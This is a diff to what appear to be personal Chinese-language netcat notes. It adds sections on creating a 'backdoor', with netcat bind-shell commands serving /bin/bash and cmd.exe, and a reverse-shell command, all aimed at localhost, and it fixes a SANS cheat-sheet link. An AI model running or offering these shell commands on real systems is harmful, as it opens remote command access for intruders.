@@ -42,7 +42,20 @@ nc -l 3333
 ssh  yantze@192.168.2.38 sleep 1; nc 127.0.0.1 3333
 ```
 
+如何正确的创建后门
+```
+nc -l 3333 -e /bin/bash
+nc -l 3333 -e cmd.exe
+nc 127.0.0.1 3333
+```
+
+如何逆向后门
+```
+nc -l 3333
+nc 127.0.0.1 3333 -e /bin/bash
+```
+
 ## 资料
-- http://www.sans.org/security-resources/sec560/netcat\_cheat\_sheet\_v1.pdf
+- https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf
 - http://www.g-loaded.eu/2006/11/06/netcat-a-couple-of-useful-examples/
 - https://dragula.viettug.org/blogs/263.html
